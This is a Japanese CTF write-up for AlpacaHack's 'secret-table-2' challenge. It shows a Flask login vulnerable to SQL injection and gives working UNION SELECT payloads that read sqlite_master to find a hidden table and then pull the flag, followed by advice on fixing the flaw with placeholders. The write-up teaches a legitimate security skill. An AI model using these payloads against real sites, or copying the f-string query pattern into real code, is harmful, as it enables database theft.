---
title: "secret-table-2 - AlpacaHack Daily"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "alpacahack", "sqli", "union-select", "sqlite", "secret-table-2"]
summary: "web writeup for \"secret-table-2\" from AlpacaHack Daily - techniques: alpacahack, sqli, union-select, sqlite, secret-table-2."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d04_secret-table-2/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "secret-table-2"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** secret-table-2
- **Date:** 2026-05-04
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d04_secret-table-2>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d04_secret-table-2/README.md>

---
# secret-table-2

## 問題

脆弱性があっても、秘密のテーブルの名前とカラムの名前がわからないなら大丈夫でしょ!
```py
@app.post("/login")
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    conn = sqlite3.connect("database.db")
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )

    error = None
    try:
        user = conn.execute(query).fetchone()
    except sqlite3.Error as e:
        user = None
        error = str(e)
    conn.close()

    if error:
        return f"SQL error: {error}"

    if user is None:
        return "invalid credentials"

    return f"Hello, {user[0]}!"


def init_db():
    conn = sqlite3.connect("database.db")

    # users
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT NOT NULL
        );
        """
    )
    for username, password in USERS.items():
        conn.execute(
            f"""
            INSERT OR IGNORE INTO users (username, password) VALUES ('{username}', '{password}');
            """
        )

    # secret
    conn.execute(
        f"""
        CREATE TABLE IF NOT EXISTS {secret_table_name} (
            {secret_column_name} TEXT PRIMARY KEY
        );
        """
    )
    conn.execute(
        f"""
        INSERT OR IGNORE INTO {secret_table_name} ({secret_column_name}) VALUES ('{FLAG}');
        """
    )

    conn.commit()
    conn.close()
```

## 概要

ログイン処理のデータベース参照のselect文作成時にプレースホルダを使っていないので、SQLインジェクションできそうです。

しかし、フラグは`users`テーブル内ではなく、名前がわからないテーブルの名前がわからない列にあるようです。

どうすればそんなよくわからないところにあるフラグを取得できるのでしょうか？

## 方針

`SQLite`の特別なテーブル`sqlite_master`を利用する。

## 解法

```py
    conn = sqlite3.connect("database.db")
```
の記述からわかるように、この問題のデータベースには`SQLite`が使われています。

`SQLite`には、テーブルやビューなどのデータベース構造が自動的に記録される読み取り専用の特別なテーブル`sqlite_master`があります。

試しに同じようなテーブルを作って`sqlite_master`を参照してみると、

```
sqlite> CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY,password TEXT NOT NULL);
sqlite> CREATE TABLE IF NOT EXISTS secret_table_name (secret_column_name TEXT PRIMARY KEY);
sqlite> .headers on
sqlite> .mode columns
sqlite> select * from sqlite_master;
type   name                                  tbl_name           rootpage  sql
-----  ------------------------------------  -----------------  --------  ------------------------------------------------------------
table  users                                 users              2         CREATE TABLE users (username TEXT PRIMARY KEY,password TEXT
                                                                          NOT NULL)

index  sqlite_autoindex_users_1              users              3

table  secret_table_name                     secret_table_name  4         CREATE TABLE secret_table_name (secret_column_name TEXT PRIM
                                                                          ARY KEY)

index  sqlite_autoindex_secret_table_name_1  secret_table_name  5
```

このようにテーブル名や列名が全てわかります。

これを使って、まず秘密のテーブルのテーブル名と列名を特定します。

Username:
```
alpaca
```

Passwerd:
```
' union select sql, 'dummy' from sqlite_master where type='table' and tbl_name<>'users'; --
```

を入力してログインしてみます。

※Usernameは何でもいいです。

※ (select文1) union (select文2)で2つのselect文を縦に結合することができます。このとき、2つ目の列数は1つ目に合わせる必要があります。

Executed SQL:
```
SELECT * FROM users WHERE username='alpaca' AND password='' union select sql, 'dummy' from sqlite_master where type='table' and tbl_name<>'users'; --';
```

Response:
```
Hello, CREATE TABLE secret_f8647d9314405bf7 (
            flag_f8647d9314405bf7 TEXT PRIMARY KEY
        )!
```

無事テーブル名と列名を特定することができました。

あとはこのテーブル名と列名を使って、下記のように入力してログインすると、フラグを得ることができます。

※本番環境で実施するときはテーブル名と列名は実際に本番環境で取得したものを使用してください。

Username:
```
alpaca
```

Passwerd:
```
' union select flag_f8647d9314405bf7, 'dummy' from secret_f8647d9314405bf7; --
```

Executed SQL:
```
SELECT * FROM users WHERE username='alpaca' AND password='' union select flag_f8647d9314405bf7, 'dummy' from secret_f8647d9314405bf7; --';
```

Response:
```
Hello, Alpaca{REDACTED}!
```

## 補足

この攻撃の怖いところは、対象のテーブルを問わないということです。

例えばログイン機能を下記のようにプレースホルダを用いて修正しSQLインジェクション対策をしたとします。
```py
    query = (
        "SELECT * FROM users WHERE username=? AND password=?;"
    )

    error = None
    try:
        user = conn.execute(query, (username, password)).fetchone()
    ...
```

しかし、別のところで例えば
```py
    query = (
        f"SELECT * FROM products WHERE description like '%{keyword}%' order by id;"
    )
```
のような対策されていない部分があれば、`products`テーブルだけでなく`users`テーブルその他全く関係ないテーブルにまで攻撃が及んでしまいます。

※今回の問題のようにデータベースの内容がそのまま表示されるものでなくても、検索結果によって何らかの挙動差があれば、「ブラインドSQLインジェクション」という手法によって情報を抜かれてしまいます。

たった１か所の対策漏れによってデータベース全体が丸裸になってしまうということですね。
